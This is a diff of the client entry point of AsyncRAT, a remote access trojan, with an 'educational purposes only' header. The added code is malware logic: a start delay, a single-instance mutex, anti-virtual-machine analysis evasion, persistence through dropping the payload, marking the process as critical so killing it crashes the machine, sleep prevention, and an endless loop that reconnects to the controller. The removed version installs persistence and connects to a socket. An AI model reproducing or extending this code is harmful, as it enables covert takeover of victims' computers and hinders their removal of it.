@@ -1,44 +1,62 @@
 ﻿using System.Threading;
-using Client.Sockets;
-using System.IO;
-using System;
+using Client.Connection;
 using Client.Install;
+using System;
+using Client.Helper;
 
-//       │ Author     : NYAN CAT
-//       │ Name       : AsyncRAT // Simple Socket
+/* 
+       │ Author       : NYAN CAT
+       │ Name         : AsyncRAT  Simple RAT
+       │ Contact Me   : https:github.com/NYAN-x-CAT
 
-//       Contact Me   : https://github.com/NYAN-x-CAT
-
-//       This program Is distributed for educational purposes only.
-
+       This program is distributed for educational purposes only.
+*/
 
 namespace Client
 {
-    /// The Main Settings
-    class Settings
+    public class Program
     {
-        public static readonly string IP = "127.0.0.1";
-        public static readonly int Port = 6606;
-        public static readonly string Version = "AsyncRAT 0.2.5";
-        public static readonly string ClientFullPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Payload.exe");
-    }
-
-    /// The Main Class
-    /// Contains all methods for socket and reading the packets
-    class Program
-    {
-
-
-        static void Main(string[] args)
+        public static void Main()
         {
-            NormalStartup.Install();
-
-            ClientSocket.InitializeClient();
-
-            while (true)
+            for (int i = 0; i < Convert.ToInt32(Settings.Delay); i++)
             {
                 Thread.Sleep(1000);
             }
-        }           
+
+            if (!Settings.InitializeSettings()) Environment.Exit(0);
+
+            try
+            {
+                if (!MutexControl.CreateMutex()) //if current payload is a duplicate
+                    Environment.Exit(0);
+
+                if (Convert.ToBoolean(Settings.Anti)) //run anti-virtual environment
+                    Anti_Analysis.RunAntiAnalysis();
+
+                if (Convert.ToBoolean(Settings.Install)) //drop payload [persistence]
+                    NormalStartup.Install();
+
+                if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin()) //active critical process
+                    ProcessCritical.Set();
+
+                Methods.PreventSleep(); //prevent pc to idle\sleep
+
+            }
+            catch { }
+
+            while (true) // ~ loop to check socket status
+            {
+                try
+                {
+                    if (!ClientSocket.IsConnected)
+                    {
+                        ClientSocket.Reconnect();
+                        ClientSocket.InitializeClient();
+                    }
+                }
+                catch { }
+                Thread.Sleep(5000);
+            }
+        }
     }
 }
